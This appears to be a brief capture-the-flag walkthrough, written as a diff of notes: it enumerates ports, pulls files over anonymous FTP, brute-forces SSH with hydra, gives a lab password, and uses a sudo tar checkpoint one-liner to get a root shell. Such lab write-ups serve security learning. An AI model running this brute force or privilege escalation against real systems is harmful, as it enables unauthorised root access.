@@ -1,0 +1,37 @@
+Scanned with enumeration.sh
+    Open ports:
+        21
+        22
+        80
+        
+ftp is anonymous login
+
+Download task.txt
+
+cat to view task.txt
+
+lin wrote the file
+
+Download locks.txt
+
+cat locks.txt
+
+Seems to be a password file
+
+hydra to exploit ssh
+
+user=lin password=RedDr4gonSynd1cat3
+
+sudo -l to see if theres sudo privileges
+
+Can run tar as sudo
+
+search gtfobins for tar exploit
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+whoami - root
+
+cd /root
+
+cat root.txt
